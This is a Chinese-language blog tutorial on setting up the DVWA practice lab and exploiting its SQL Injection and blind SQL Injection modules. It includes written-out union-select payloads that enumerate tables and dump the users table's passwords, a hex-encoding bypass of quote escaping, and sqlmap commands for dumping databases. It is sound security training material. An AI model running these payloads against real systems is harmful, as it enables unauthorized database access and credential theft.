        <content type="html"><![CDATA[<h1 id="一-DVWA介绍"><a href="#一-DVWA介绍" class="headerlink" title="一.DVWA介绍"></a>一.DVWA介绍</h1><h2 id="1-1-DVWA简介"><a href="#1-1-DVWA简介" class="headerlink" title="1.1 DVWA简介"></a>1.1 DVWA简介</h2><p>DVWA是一款基于PHP和MYSQL开发的web靶场练习平台，集成了常见的web漏洞如sql注入,XSS，密码破解等常见漏洞。旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p><h2 id="1-2-DVWA模块"><a href="#1-2-DVWA模块" class="headerlink" title="1.2 DVWA模块"></a>1.2 DVWA模块</h2><p>DVWA共有十个模块：</p><ol><li><p>Brute Force（暴力（破解））</p></li><li><p>Command Injection（命令行注入）</p></li><li><p>CSRF（跨站请求伪造）</p></li><li><p>File Inclusion（文件包含）</p></li><li><p>File Upload（文件上传）</p></li><li><p>Insecure CAPTCHA （不安全的验证码）</p></li><li><p>SQL Injection（SQL注入）</p></li><li><p>SQL Injection（Blind）（SQL盲注）</p></li><li><p>XSS（Reflected）（反射型跨站脚本</p></li><li><p>XSS（Stored）（存储型跨站脚本）<br>1.3 DVWA 安全级别</p></li></ol><p>一般情况下，DVWA一共有四种安全级别，分别为：</p><p>Low、Medium、High、Impossible</p><h1 id="二-DVWA的搭建"><a href="#二-DVWA的搭建" class="headerlink" title="二.DVWA的搭建"></a>二.DVWA的搭建</h1><h2 id="2-1-phpstudy的搭建"><a href="#2-1-phpstudy的搭建" class="headerlink" title="2.1 phpstudy的搭建"></a>2.1 phpstudy的搭建</h2><p>phpstudy下载地址<a href="">小皮面板(phpstudy) - 让天下没有难配的服务器环境！ (xp.cn)</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193611383.png" alt="image-20230717193611383"></p><p>下载完后双击压缩包中的应用程序</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193648976.png" alt="image-20230717193648976"></p><p>选择路径，这里我存储在D盘中</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193711099.png" alt="image-20230717193711099"></p><p>然后就安装成功了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193721741.png" alt="image-20230717193721741"></p><h2 id="2-2DVWA的搭建"><a href="#2-2DVWA的搭建" class="headerlink" title="2.2DVWA的搭建"></a>2.2DVWA的搭建</h2><p><a href="https://raw.githubusercontent.com/zb423/image/main/image-20230629205445441.png">DVWA的官网DVWA - 该死的易受攻击的Web应用程序</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193733244.png" alt="image-20230717193733244"></p><p> 将其解压到PHPstudy路径下的PHPTutorial下的WWW目录下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193740387.png" alt="image-20230717193740387"></p><p>解压后进入DVWA下的config文件打开config.inc.php文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193746988.png" alt="image-20230717193746988"></p><p>将p@ssw0rd 修改为 root </p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193754318.png" alt="image-20230717193754318"></p><p>然后在浏览器中访问<a href="http://127.0.0.1/DVWA-master/setup.php,%E7%84%B6%E5%90%8E%E7%82%B9%E5%87%BB%E7%BD%91%E7%AB%99%E4%B8%8B%E6%96%B9%E7%9A%84Create/Reset">http://127.0.0.1/DVWA-master/setup.php,然后点击网站下方的Create/Reset</a> Database按钮</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193801916.png" alt="image-20230717193801916"></p><p> 接着会跳转到DVWA的登录页面默认用户名：admin 默认密码：password 成功登录</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193811229.png" alt="image-20230717193811229"></p><h1 id="三-SQL注入漏洞"><a href="#三-SQL注入漏洞" class="headerlink" title="三.SQL注入漏洞"></a>三.SQL注入漏洞</h1><h2 id="3-1-SQL注入原理"><a href="#3-1-SQL注入原理" class="headerlink" title="3.1 SQL注入原理"></a>3.1 SQL注入原理</h2><p>  就是通过把恶意的sql命令插入web表单递交给服务器，或者输入域名或页面请求的查询字符串递交到服务器，达到欺骗服务器，让服务器执行这些恶意的sql命令，从而让攻击者，可以绕过一些机制，达到直接访问数据库的一种攻击手段。</p><h2 id="3-2-SQL注入分类"><a href="#3-2-SQL注入分类" class="headerlink" title="3.2 SQL注入分类"></a>3.2 SQL注入分类</h2><p>(1)数字型        （2）字符型       （3）报错注入     （4）Boollean注入                （5）时间注入</p><h2 id="3-3-SQL注入思路"><a href="#3-3-SQL注入思路" class="headerlink" title="3.3 SQL注入思路"></a>3.3 SQL注入思路</h2><p>(1).判断是否存在注入，注入是字符型还是数字型</p><p>(2).猜解SQL查询语句中的字段数</p><p>(3).确定回显位置</p><p>(4).获取当前数据库</p><p>(5).获取数据库中的表</p><p>(6).获取表中的字段名</p><p>(7).得到数据</p><h2 id="3-4-SQL注入绕过方法"><a href="#3-4-SQL注入绕过方法" class="headerlink" title="3.4 SQL注入绕过方法"></a>3.4 SQL注入绕过方法</h2><p>(1)注释符号绕过         (2)大小写绕过         (3)内联注释绕过</p><p>(4)特殊编码绕过         (5)空格过滤绕过       (6)过滤or and xor not 绕过</p><h1 id="四-SQL注入漏洞的分析"><a href="#四-SQL注入漏洞的分析" class="headerlink" title="四.SQL注入漏洞的分析"></a>四.SQL注入漏洞的分析</h1><h2 id="4-1-定义"><a href="#4-1-定义" class="headerlink" title="4.1 定义"></a>4.1 定义</h2><p>SQL注入（SQLi）是一种注入攻击，可以执行恶意SQL语句。它通过将任意SQL代码插入数据库查询，使攻击者能够完全控制Web应用程序后面的数据库服务器。攻击者可以使用SQL注入漏洞绕过应用程序安全措施；可以绕过网页或Web应用程序的身份验证和授权，并检索整个SQL数据库的内容；还可以使用SQL注入来添加，修改和删除数据库中的记录。</p><h2 id="4-2-原因"><a href="#4-2-原因" class="headerlink" title="4.2 原因"></a>4.2 原因</h2><p>SQL 注入漏洞存在的原因，就是拼接SQL参数。也就是将用于输入的查询参数，直接拼接在SQL语句中，导致了SQL注入漏洞。</p><p>web 开发人员无法保证所有的输入都已经过滤</p><p>攻击者利用发送给服务器的输入参数构造可执行的 SQL 代码（可加入到 get 请求、 post 谓求、 http 头信思、 cookie 中）</p><p>数据库未做相应的安全配置</p><h1 id="五-SQL-Injection"><a href="#五-SQL-Injection" class="headerlink" title="五.SQL Injection"></a>五.SQL Injection</h1><h2 id="1-low级别"><a href="#1-low级别" class="headerlink" title="1.low级别"></a>1.low级别</h2><p>(1)判断注入类型，是数字型注入，还是字符型注入</p><p>我们输入1，看到正确返回值</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193826003.png" alt="image-20230717193826003"></p><p> 我们输入1’，看到报错了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193835502.png" alt="image-20230717193835502"> 我们可以猜出到是字符型注入，我们继续输入1’ and ‘1’ &#x3D;’1和1’ and ‘1’&#x3D;’2。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717193900346.png" alt="image-20230717193900346"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194013365.png" alt="image-20230717194013365"></p><p>我们根据id&#x3D;1’报错和id&#x3D;1’ and ‘1’&#x3D;’1正确，我们可以知道是字符型注入，查看源代码知道就是字符型注入。</p><p>(2)判断字段数                                     order by </p><p>我们使用order by 进行判断字段数， 至到order by 进行报错时候就是字段数</p><p>id&#x3D;1’ order by 1#没有报错</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194035231.png" alt="image-20230717194035231"></p><p> id&#x3D;1’ order by 2# 没有报错</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194043999.png" alt="image-20230717194043999"></p><p> id&#x3D;1’ order by 3#时报错了，说明字段只有2列</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194051755.png" alt="image-20230717194051755"></p><p>(3)判断回显位置                       union select 1,2#</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194102991.png" alt="image-20230717194102991"></p><p> 可以知道回显位置 在这二个地方</p><p>(4)判断数据库                                     union select 1,database()#</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194111638.png" alt="image-20230717194111638"></p><p>(5)获取表名          1’  union select 1,group_concat(table_name) from information_schema.tables where 获取字段名 tables_schema&#x3D;database()#</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194119408.png" alt="image-20230717194119408"></p><p> (6)获取字段名                  1’ union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’#</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194126766.png" alt="image-20230717194126766"></p><p>(7)获取数据    1’ union select user,password from users # </p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194134854.png" alt="image-20230717194134854"></p><h2 id="2-medium级别"><a href="#2-medium级别" class="headerlink" title="2.medium级别"></a>2.medium级别</h2><p>(1)判断注入类型     我们可以看到无法输入数字，所以我们进行抓包在bp中进行SQL注入</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194148599.png" alt="image-20230717194148599"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194154638.png" alt="image-20230717194154638"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194200875.png" alt="image-20230717194200875"></p><p>我们输入id&#x3D;1’ and ‘1’&#x3D;’1看见报错了，输入id&#x3D;1 and 1&#x3D;1没有报错。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194209446.png" alt="image-20230717194209446"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194224213.png" alt="image-20230717194224213"></p><p>所以注入类型为数字类型 </p><p>(2)判断列数</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194232999.png" alt="image-20230717194232999"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194241218.png" alt="image-20230717194241218"></p><p> 我们知道列数为2列</p><p>（3）判断回显位置   </p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194248360.png" alt="image-20230717194248360"></p><p>我们可以知道回显位置是2</p><p>(4)判断数据库</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194256424.png" alt="image-20230717194256424"></p><p>（5）判断表名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194306019.png" alt="image-20230717194306019"></p><p> (6)判断列名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194317083.png" alt="image-20230717194317083"></p><p>我们输入users之后，发现没有如何反应</p><p>通过源代码我们可以知道，发现它对单引号进行了转义，我们采用16进制绕过，得知users的十六进制为 0x75736572</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194324699.png" alt="image-20230717194324699"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194331510.png" alt="image-20230717194331510"></p><p> (7)获取数据</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194337943.png" alt="image-20230717194337943"></p><h2 id="3-high级别"><a href="#3-high级别" class="headerlink" title="3.high级别"></a>3.high级别</h2><p>（1）判断注入类型</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194344722.png" alt="image-20230717194344722"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194355317.png" alt="image-20230717194355317"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194401750.png" alt="image-20230717194401750"></p><p>我们可以知道是字符型注入</p><p>(2)判断列数</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194410107.png" alt="image-20230717194410107"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194420802.png" alt="image-20230717194420802"></p><p>列数为2列，我们可以发现high级别和low级别的步骤是一样的，所以我在这里就不写了，可以参考low级别的步骤就行了</p><h1 id="六-SQL-Injection-Blind"><a href="#六-SQL-Injection-Blind" class="headerlink" title="六.SQL Injection (Blind)"></a>六.SQL Injection (Blind)</h1><p>我们在讲SQL Injection (Blind)之前，先讲一下什么是sqlmap注入。</p><p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL进行SQL注入。目前支持的数据库有MySql、Oracle、Access、PostageSQL、SQL Server、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB等。</p><p>Sqlmap采用了以下5种独特的SQL注入技术</p><ol><li>基于布尔类型的盲注，即可以根据返回页面判断条件真假的注入</li><li>基于时间的盲注，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已经执行(即页面返回时间是否增加)来判断</li><li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中</li><li>联合查询注入，在可以使用Union的情况下注入</li><li>堆查询注入，可以同时执行多条语句时的注入</li></ol><p>Sqlmap的强大的功能包括 数据库指纹识别、数据库枚举、数据提取、访问目标文件系统，并在获取完全的操作权限时执行任意命令。</p><p>sqlmap是一个跨平台的工具，很好用，是SQL注入方面一个强大的工具！</p><p>我们可以使用 -h 参数查看sqlmap的参数以及用法，sqlmap  -h</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194455930.png" alt="image-20230717194455930"></p><p> sqlmap的使用方法:sqlmap -u  url 是对网站进行注入  </p><p>​            sqlmap -r  是对文件进行注入       </p><p>这里我们对SQL Injection的low级别进行sqlmap，具体过程我写在了图片上面</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194520475.png" alt="image-20230717194520475"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194647852.png" alt="image-20230717194647852"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194700081.png" alt="image-20230717194700081"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194709759.png" alt="image-20230717194709759"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194718055.png" alt="image-20230717194718055"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194725978.png" alt="image-20230717194725978"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194733960.png" alt="image-20230717194733960"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194741766.png" alt="image-20230717194741766"></p><h2 id="1-low级别-1"><a href="#1-low级别-1" class="headerlink" title="1.low级别"></a>1.low级别</h2><p>(1)我们先进行抓包</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194755683.png" alt="image-20230717194755683"></p><p> (2)然后使用sqlmap</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194803594.png" alt="image-20230717194803594"></p><p>(3)爆破数据库              –dbs</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194816445.png" alt="image-20230717194816445"></p><p> (4)爆破表名                             -D ‘dvwa’ –tables</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194840861.png" alt="image-20230717194840861"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194849533.png" alt="image-20230717194849533"></p><p> (5)爆破字段名    -D ‘dvwa’  -T ‘ guestbook’ –columns</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194855590.png" alt="image-20230717194855590"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194909396.png" alt="image-20230717194909396"></p><p> (6)爆破数据</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194918531.png" alt="image-20230717194918531"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20230717194926654.png" alt="image-20230717194926654"></p><p>后面的我们都可以使用sqlmap进行注入,所以后面的就在这里不讲解了。</p><p>本篇文章转载于我的csdn博客:<a href="https://blog.csdn.net/qq_58091216/article/details/124484529?spm=1001.2014.3001.5501">https://blog.csdn.net/qq_58091216/article/details/124484529?spm=1001.2014.3001.5501</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
